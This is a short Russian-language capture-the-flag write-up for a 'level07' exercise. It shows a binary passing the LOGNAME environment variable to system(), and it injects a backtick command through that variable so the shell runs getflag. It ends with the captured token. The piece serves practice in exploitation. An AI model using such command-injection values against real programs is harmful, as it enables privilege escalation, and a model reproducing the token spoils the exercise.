В папке исполняемый файл, который при запуске выводит level07

Прогоняем файл через ltrace. Видим строки:
	getenv("LOGNAME") = "level07"
	system("/bin/echo level07
	
Выставляем значение в переменную окружения LOGNAME:
	export LOGNAME=\`getflag\`
	
Обратные кавычки дают указание shell исполнить программу перед передачей в echo, поэтому запустится getflag

token: fiumuikeil55xe9cu4dood66h